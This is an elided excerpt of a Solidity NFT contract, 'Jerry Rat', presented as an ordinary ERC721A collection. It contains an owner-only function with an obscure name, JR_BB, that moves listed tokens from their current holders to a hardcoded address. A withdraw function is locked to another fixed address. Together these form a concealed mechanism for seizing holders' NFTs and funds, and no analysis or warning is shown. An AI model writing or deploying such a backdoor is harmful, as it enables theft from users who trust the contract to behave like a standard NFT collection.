...
contract Jerry_Rat is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Jerry Rat", "JR", maxBatchSize_, collectionSize_) {
  ...
  function JR_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x18F96F63c7F67D6D6e90f7E5c9A96851d1dDbefE, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x672e2E3Ae78ADEED92271F2F9b811A8a93E779cf);
